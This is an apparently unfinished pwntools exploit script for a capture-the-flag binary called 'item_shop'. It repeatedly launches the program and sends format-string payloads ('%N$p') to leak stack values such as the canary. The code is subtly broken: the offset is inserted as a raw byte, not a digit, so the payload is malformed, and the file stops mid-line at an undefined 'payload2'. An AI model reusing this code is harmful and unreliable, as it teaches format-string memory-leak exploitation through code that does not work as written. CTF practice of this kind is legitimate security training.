from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./item_shop")
#libc = ELF("./libc.so.6")
ld_preload = {"LD_PRELOAD": "/home/fresh/github/CTF/2023/Defcon31/htb-defcon/item_shop/challenge/glibc/libc.so.6"}


#p = remote("ip", 4444)
#p = process("./item_shop")
#p = gdb.debug("./item_shop", '''
#break *main
#break *main+115
#break *main+212
#break *discount_code+218
#break *discount_code+266
#''', env=ld_preload)
# integer
i = 1;

while True:
    p = process("./item_shop")
    # Canary leak
    
    # Integer to bytes
    int2byte = i.to_bytes(1, 'little')

    memleak = b'%' + int2byte + b'$p'
    p.sendline(memleak)

    #pie_memleak = b'%6$p'
    #p.sendline(pie_memleak)

    print("leak:", p.recvline())

    p.close()
    byte2int = int2byte.from_bytes(1, byteorder='little')
    byte2int = i 
    i += 1
    print('Count: ', i)
    time.sleep(1)

    payload1 = b'%x'
    payload2
